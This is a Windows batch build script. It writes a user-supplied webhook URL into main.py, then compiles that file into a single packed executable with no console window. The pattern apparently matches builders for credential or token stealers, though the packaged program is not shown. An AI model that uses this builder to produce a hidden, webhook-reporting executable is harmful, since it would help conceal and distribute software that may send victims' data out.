@ECHO OFF

PYTHON -c "exec('''with open('main.py', 'r', encoding='utf-8') as f: content = f.read().replace('WEBHOOK_URL', str(input('Webhook URL: ')))\nwith open('main.py', 'w', encoding='utf-8') as f: f.write(content)''')"
ECHO INTALLING REQUIREMENTS && pip install --upgrade -r requirements.txt
ECHO INSTALLING UPX && curl -L -O https://github.com/upx/upx/releases/download/v3.96/upx-3.96-win64.zip && unzip upx-3.96-win64.zip && mv upx-3.96-win64 upx
ECHO COMPILING TO EXE && python -m PyInstaller --onefile --noconsole --upx-dir ./upx -i NONE --distpath ./ .\main.py 
ECHO REMOVING BUILD FILES && rm -rf build __pycache__ main.spec upx-3.96-win64.zip upx
COLOR 02 && ECHO DONE && PAUSE && COLOR 07 && EXIT